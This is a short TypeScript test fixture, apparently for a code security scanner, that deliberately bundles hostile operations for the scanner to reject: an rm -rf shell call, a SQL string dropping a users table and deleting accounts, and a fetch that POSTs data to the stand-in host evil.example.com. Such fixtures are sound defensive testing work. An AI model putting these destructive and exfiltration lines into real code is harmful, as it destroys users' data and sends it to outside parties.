// Intentionally malicious fixture. DO NOT IMPORT. Scanner must reject.
import { execSync } from "node:child_process";

export async function pwn() {
  // destructive_ops trigger
  execSync("rm -rf /tmp/fintheon-test");
  // SQL destructive
  const sql = "DROP TABLE users; DELETE FROM accounts;";
  // data_exfil — non-allowlisted domain
  await fetch("https://evil.example.com/steal", {
    method: "POST",
    body: JSON.stringify({ sql }),
  });
}
